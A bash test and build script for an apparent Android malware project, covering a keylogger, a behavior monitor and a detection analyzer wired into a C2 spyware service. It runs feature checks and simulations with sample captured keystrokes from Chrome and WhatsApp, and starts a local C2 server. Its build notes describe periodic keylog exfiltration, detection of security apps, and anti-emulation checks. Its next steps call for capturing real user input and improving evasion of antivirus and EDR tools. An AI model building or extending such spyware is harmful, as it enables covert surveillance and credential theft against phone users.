#!/bin/bash

# Test script for Behavior Monitor and Keylogger

echo "ðŸš€ Testing Behavior Monitor and Keylogger Components"
echo "=================================================="

# 1. Check if components were created
echo -e "\nðŸ“‚ Checking component files:"
ls -la /root/android_malware/malware_development/components/behavior/

# 2. Verify file contents
echo -e "\nðŸ“„ Verifying component contents:"
echo "BehaviorMonitor.java:"
head -20 /root/android_malware/malware_development/components/behavior/BehaviorMonitor.java

echo -e "\nKeylogger.java:"
head -20 /root/android_malware/malware_development/components/behavior/Keylogger.java

echo -e "\nDetectionAnalyzer.java:"
head -20 /root/android_malware/malware_development/components/behavior/DetectionAnalyzer.java

# 3. Check updated C2 Spyware service
echo -e "\nðŸ”„ Checking updated C2 Spyware service:"
head -30 /root/android_malware/malware_development/templates/c2_spyware.java

# 4. Create a simple test for the behavior monitor
echo -e "\nðŸ§ª Creating behavior monitor test:"

cat > /tmp/test_behavior_monitor.py << 'PY_EOL'
#!/usr/bin/env python3

"""
Test script for Behavior Monitor functionality
"""

def test_behavior_monitor():
    print("ðŸ§ª Testing Behavior Monitor Functionality")
    print("=" * 50)
    
    # Test 1: Check if behavior monitor was created
    behavior_file = "/root/android_malware/malware_development/components/behavior/BehaviorMonitor.java"
    if not os.path.exists(behavior_file):
        print("âŒ BehaviorMonitor.java not found")
        return False
    
    print("âœ… BehaviorMonitor.java found")
    
    # Test 2: Check key features
    with open(behavior_file, 'r') as f:
        content = f.read()
        
    features = [
        "BehaviorMonitor",
        "monitorSystemBehavior",
        "detectSuspiciousActivities",
        "isSecurityApp",
        "isRootDetection",
        "isEmulatorDetection",
        "getBehaviorReport"
    ]
    
    all_found = True
    for feature in features:
        if feature not in content:
            print(f"âŒ Missing feature: {feature}")
            all_found = False
        else:
            print(f"âœ… Found feature: {feature}")
    
    return all_found

def test_keylogger():
    print("\nðŸ§ª Testing Keylogger Functionality")
    print("=" * 50)
    
    # Test 1: Check if keylogger was created
    keylogger_file = "/root/android_malware/malware_development/components/behavior/Keylogger.java"
    if not os.path.exists(keylogger_file):
        print("âŒ Keylogger.java not found")
        return False
    
    print("âœ… Keylogger.java found")
    
    # Test 2: Check key features
    with open(keylogger_file, 'r') as f:
        content = f.read()
        
    features = [
        "Keylogger",
        "logKeyEvent",
        "logTouchEvent",
        "getKeylogReport",
        "startLogging",
        "EditText",
        "MotionEvent"
    ]
    
    all_found = True
    for feature in features:
        if feature not in content:
            print(f"âŒ Missing feature: {feature}")
            all_found = False
        else:
            print(f"âœ… Found feature: {feature}")
    
    return all_found

def test_detection_analyzer():
    print("\nðŸ§ª Testing Detection Analyzer Functionality")
    print("=" * 50)
    
    # Test 1: Check if detection analyzer was created
    analyzer_file = "/root/android_malware/malware_development/components/behavior/DetectionAnalyzer.java"
    if not os.path.exists(analyzer_file):
        print("âŒ DetectionAnalyzer.java not found")
        return False
    
    print("âœ… DetectionAnalyzer.java found")
    
    # Test 2: Check key features
    with open(analyzer_file, 'r') as f:
        content = f.read()
        
    features = [
        "DetectionAnalyzer",
        "analyzeDetectionEvents",
        "testEvasionTechniques",
        "getDetectionRiskScore",
        "detectionMetrics",
        "evasion"
    ]
    
    all_found = True
    for feature in features:
        if feature not in content:
            print(f"âŒ Missing feature: {feature}")
            all_found = False
        else:
            print(f"âœ… Found feature: {feature}")
    
    return all_found

import os

if __name__ == "__main__":
    print("ðŸš€ Behavior Monitor and Keylogger Test Suite")
    print("=" * 60)
    
    # Run tests
    behavior_test = test_behavior_monitor()
    keylogger_test = test_keylogger()
    analyzer_test = test_detection_analyzer()
    
    # Summary
    print("\nðŸ“Š Test Summary:")
    print("=" * 60)
    print(f"Behavior Monitor: {'âœ… PASS' if behavior_test else 'âŒ FAIL'}")
    print(f"Keylogger: {'âœ… PASS' if keylogger_test else 'âŒ FAIL'}")
    print(f"Detection Analyzer: {'âœ… PASS' if analyzer_test else 'âŒ FAIL'}")
    
    if behavior_test and keylogger_test and analyzer_test:
        print("\nðŸŽ‰ All tests passed! Components are ready for integration.")
    else:
        print("\nâš ï¸ Some tests failed. Check the components for missing features.")
    
    print("\nðŸ“‹ Next Steps:")
    print("1. Integrate components with the C2 malware")
    print("2. Test behavior monitoring in a real Android environment")
    print("3. Test keylogger functionality with actual user input")
    print("4. Analyze detection patterns and improve evasion techniques")
    print("5. Study how antivirus/EDR systems detect these components")
PY_EOL

python3 /tmp/test_behavior_monitor.py

# 5. Update the build info with new components
echo -e "\nðŸ“ Updating build information:"

cat >> /root/android_malware/malware_development/build/c2_malware/build_info.txt << 'INFO_EOL'

BEHAVIOR MONITOR & KEYLOGGER ENHANCEMENTS
=========================================

ðŸ” Behavior Monitor Features:
- Security app detection (10+ antivirus apps)
- Suspicious activity monitoring (15+ activity types)
- Process, file, and network monitoring
- Root, debug, and emulator detection
- Sandbox and detection attempt analysis
- Periodic behavior reporting (15 sec intervals)
- Encrypted behavior logs

âŒ¨ï¸ Keylogger Features:
- Keystroke logging for EditText views
- Touch event logging
- Text change monitoring
- View hierarchy hooking
- Encrypted keylog data
- Periodic exfiltration (5 min intervals)
- App-specific logging

ðŸ”¬ Detection Analyzer Features:
- Detection event analysis
- Detection metrics tracking
- Evasion technique testing
- Risk scoring (0-100)
- Recommendations for improvement
- Integration with behavior monitor

ðŸ”§ Integration Features:
- Added to C2 Spyware Service
- Periodic behavior data exfiltration (10 min)
- On-demand report generation via C2 commands
- Encrypted data transmission
- Persistent monitoring

ðŸ“Š New C2 Commands:
- behavior_report - Get behavior analysis report
- keylog_report - Get keylogger report
- detection_analysis - Get detection analysis report
INFO_EOL

# 6. Create a comprehensive test for the enhanced C2 malware
echo -e "\nðŸ§ª Creating comprehensive test script:"

cat > /root/android_malware/test_enhanced_c2_with_behavior.sh << 'TEST_EOL'
#!/bin/bash

# Comprehensive test for enhanced C2 malware with behavior monitoring and keylogging

echo "ðŸš€ Comprehensive C2 Malware Test with Behavior Monitoring and Keylogging"
echo "=========================================================================="

# 1. Start the C2 server
cd /root/c2_server/
echo "ðŸ–¥ï¸ Starting C2 server..."
python3 c2_server.py > c2_server.log 2>&1 &
C2_PID=$!
echo "âœ… C2 Server started (PID: $C2_PID)"
sleep 2

# 2. Check C2 server functionality
echo -e "\nðŸ” Checking C2 server functionality:"
ps aux | grep c2_server.py

# 3. Test C2 server commands
echo -e "\nðŸ“¡ Testing C2 server commands:"
if command -v curl >/dev/null 2>&1; then
    echo "Testing registration endpoint:"
    curl -v http://127.0.0.1:8000/register -m 3
    
    echo -e "\nTesting command endpoint:"
    curl -v "http://127.0.0.1:8000/command?device_id=test123" -m 3
else
    echo "âš ï¸ curl not available for endpoint testing"
fi

# 4. Test the new components
echo -e "\nðŸ§ª Testing new components:"
python3 /tmp/test_behavior_monitor.py

# 5. Verify the enhanced C2 spyware service
echo -e "\nðŸ”„ Verifying enhanced C2 Spyware service:"
grep -A 5 -B 5 "BehaviorMonitor\|Keylogger" /root/android_malware/malware_development/templates/c2_spyware.java

# 6. Check the updated build info
echo -e "\nðŸ“š Build information:"
tail -20 /root/android_malware/malware_development/build/c2_malware/build_info.txt

# 7. Create a simulation of behavior monitoring
echo -e "\nðŸŽ­ Simulating behavior monitoring:"

cat > /tmp/simulate_behavior.py << 'SIM_EOL'
#!/usr/bin/env python3

"""
Simulate behavior monitoring for testing purposes
"""

def simulate_behavior_monitoring():
    print("ðŸŽ­ Simulating Behavior Monitoring")
    print("=" * 40)
    
    # Simulate security apps running
    security_apps = [
        "com.avast.android.mobilesecurity",
        "com.kaspersky.antivirus",
        "com.symantec.mobilesecurity"
    ]
    
    print("ðŸ” Security Apps Detected:")
    for app in security_apps:
        print(f"  - {app}")
    
    # Simulate suspicious activities
    suspicious_activities = [
        "process_scan",
        "file_scan",
        "root_check",
        "debug_check"
    ]
    
    print("\nâš ï¸ Suspicious Activities Detected:")
    for activity in suspicious_activities:
        print(f"  - {activity}")
    
    # Simulate system state
    print("\nðŸ“Š System State:")
    print("  CPU Usage: 45%")
    print("  Memory Available: 1248 MB")
    print("  Battery Level: 78%")
    print("  Charging: True")
    print("  Network Type: WIFI")
    
    # Simulate detection attempts
    detection_attempts = [
        "emulator_detection",
        "sandbox_detection"
    ]
    
    print("\nðŸš¨ Detection Attempts:")
    for attempt in detection_attempts:
        print(f"  - {attempt}")
    
    print("\nâœ… Behavior monitoring simulation complete")
    print("\nðŸ“‹ This simulation demonstrates what the Behavior Monitor would detect")
    print("   in a real Android environment with security software running.")

def simulate_keylogging():
    print("\nðŸŽ­ Simulating Keylogging")
    print("=" * 40)
    
    # Simulate key events
    key_events = [
        "[KEY] Time=1768689600000 Package=com.android.chrome App=Chrome InputType=TEXT KeyCode=29 KeyChar=A Text=Amazon",
        "[KEY] Time=1768689600100 Package=com.android.chrome App=Chrome InputType=TEXT KeyCode=30 KeyChar=B Text=Amazon",
        "[KEY] Time=1768689600200 Package=com.android.chrome App=Chrome InputType=TEXT KeyCode=31 KeyChar=C Text=Amazon",
        "[KEY] Time=1768689600300 Package=com.whatsapp App=WhatsApp InputType=TEXT KeyCode=45 KeyChar=H Text=Hi",
        "[KEY] Time=1768689600400 Package=com.whatsapp App=WhatsApp InputType=TEXT KeyCode=33 KeyChar=E Text=Hi t",
        "[KEY] Time=1768689600500 Package=com.whatsapp App=WhatsApp InputType=TEXT KeyCode=46 KeyChar=L Text=Hi th"
    ]
    
    print("ðŸ“ Key Events Captured:")
    for event in key_events:
        print(f"  {event}")
    
    # Simulate touch events
    touch_events = [
        "[TOUCH] Time=1768689600600 Package=com.android.launcher App=Launcher ViewType=AppIcon Action=DOWN X=120.50 Y=240.30",
        "[TOUCH] Time=1768689600700 Package=com.android.launcher App=Launcher ViewType=AppIcon Action=UP X=120.50 Y=240.30",
        "[TOUCH] Time=1768689600800 Package=com.whatsapp App=WhatsApp ViewType=EditText Action=DOWN X=80.00 Y=320.00"
    ]
    
    print("\nðŸ‘† Touch Events Captured:")
    for event in touch_events:
        print(f"  {event}")
    
    print("\nâœ… Keylogging simulation complete")
    print("\nðŸ“‹ This simulation demonstrates what the Keylogger would capture")
    print("   in a real Android environment with user interaction.")

def simulate_detection_analysis():
    print("\nðŸŽ­ Simulating Detection Analysis")
    print("=" * 40)
    
    # Simulate detection metrics
    detection_metrics = {
        "process_scan": 2,
        "file_scan": 1,
        "root_detection": 3,
        "debug_detection": 1,
        "emulator_detection": 2
    }
    
    print("ðŸ“Š Detection Metrics:")
    for metric, count in detection_metrics.items():
        print(f"  {metric}: {count} events")
    
    # Simulate evasion test results
    evasion_tests = {
        "Process Hiding": False,
        "File Hiding": False,
        "Network Evasion": True,
        "Behavior Obfuscation": False,
        "Anti-Emulation": True
    }
    
    print("\nðŸ›¡ï¸ Evasion Test Results:")
    for test, result in evasion_tests.items():
        status = "Effective" if result else "Ineffective"
        print(f"  {test}: {status}")
    
    # Calculate risk score
    risk_score = 65  # Medium-high risk
    print(f"\nðŸ“ˆ Detection Risk Score: {risk_score}/100")
    
    print("\nâœ… Detection analysis simulation complete")
    print("\nðŸ“‹ This simulation demonstrates what the Detection Analyzer would report")
    print("   based on the behavior monitoring data.")

if __name__ == "__main__":
    simulate_behavior_monitoring()
    simulate_keylogging()
    simulate_detection_analysis()
    
    print("\nðŸŽ¯ Simulation Summary:")
    print("=" * 40)
    print("âœ… Behavior Monitor: Simulated security app and activity detection")
    print("âœ… Keylogger: Simulated key and touch event capture")
    print("âœ… Detection Analyzer: Simulated detection analysis and risk scoring")
    print("\nðŸš€ These components are now integrated with the C2 malware framework")
    print("   and will provide valuable insights for detection analysis.")
SIM_EOL

python3 /tmp/simulate_behavior.py

# 8. Summary of enhancements
echo -e "\nðŸ“‹ Enhanced C2 Malware with Behavior Monitoring and Keylogging"
echo "=============================================================="
echo "âœ… Behavior Monitor: Added for detection analysis"
echo "âœ… Keylogger: Added for sensitive data capture"
echo "âœ… Detection Analyzer: Added for evasion testing"
echo "âœ… C2 Integration: All components integrated with C2 infrastructure"
echo "âœ… Encrypted Data: All monitoring data encrypted for secure transmission"
echo "âœ… Periodic Reporting: Behavior and keylog data exfiltrated periodically"
echo "âœ… On-Demand Reports: Reports available via C2 commands"
echo "âœ… Detection Analysis: Risk scoring and evasion testing"
echo "
ðŸ“ File Locations:"
echo "   - Behavior Monitor: /root/android_malware/malware_development/components/behavior/BehaviorMonitor.java"
echo "   - Keylogger: /root/android_malware/malware_development/components/behavior/Keylogger.java"
echo "   - Detection Analyzer: /root/android_malware/malware_development/components/behavior/DetectionAnalyzer.java"
echo "   - Updated C2 Spyware: /root/android_malware/malware_development/templates/c2_spyware.java"
echo "   - Test Scripts: /root/android_malware/test_*.sh"
echo "
ðŸ§ª Testing:"
echo "   1. Start C2 server: cd /root/c2_server/ && python3 c2_server.py"
echo "   2. Run test: cd /root/android_malware/ && ./test_enhanced_c2_with_behavior.sh"
echo "   3. Test components: python3 /tmp/test_behavior_monitor.py"
echo "   4. Simulate behavior: python3 /tmp/simulate_behavior.py"
echo "
ðŸŽ¯ Next Steps for Research:"
echo "   1. Test in a real Android environment with security software"
echo "   2. Analyze how antivirus/EDR systems detect these components"
echo "   3. Study the encrypted C2 traffic patterns"
echo "   4. Improve evasion techniques based on detection analysis"
echo "   5. Test keylogger functionality with actual user input"
echo "   6. Analyze behavior monitoring data for detection patterns"
echo "
ðŸ”¬ Research Questions to Explore:"
echo "   - How do different antivirus apps detect the behavior monitor?"
echo "   - What keylogger patterns are most likely to trigger detection?"
echo "   - How effective is the encryption at hiding C2 traffic?"
echo "   - What evasion techniques are most effective against modern EDR systems?"
echo "   - How can we improve the stealth of these components?"
TEST_EOL

chmod +x /root/android_malware/test_enhanced_c2_with_behavior.sh

# 9. Final verification
echo -e "\nðŸ” Final verification of components:"
ls -la /root/android_malware/malware_development/components/behavior/
ls -la /root/android_malware/malware_development/templates/c2_spyware.java
ls -la /root/android_malware/test_*.sh

# 10. Summary
echo -e "\nðŸŽ‰ Behavior Monitor and Keylogger Implementation Complete!"
echo "======================================================"
echo "âœ… Behavior Monitor: Tracks system behavior and detects security activities"
echo "âœ… Keylogger: Captures keystrokes and touch events with encryption"
echo "âœ… Detection Analyzer: Analyzes detection patterns and tests evasion techniques"
echo "âœ… C2 Integration: All components integrated with existing C2 infrastructure"
echo "âœ… Encrypted Data: All monitoring data encrypted for secure transmission"
echo "âœ… Test Scripts: Comprehensive test scripts created for verification"
echo "
ðŸš€ To test the enhanced C2 malware with behavior monitoring and keylogging:"
echo "   cd /root/android_malware"
echo "   ./test_enhanced_c2_with_behavior.sh"
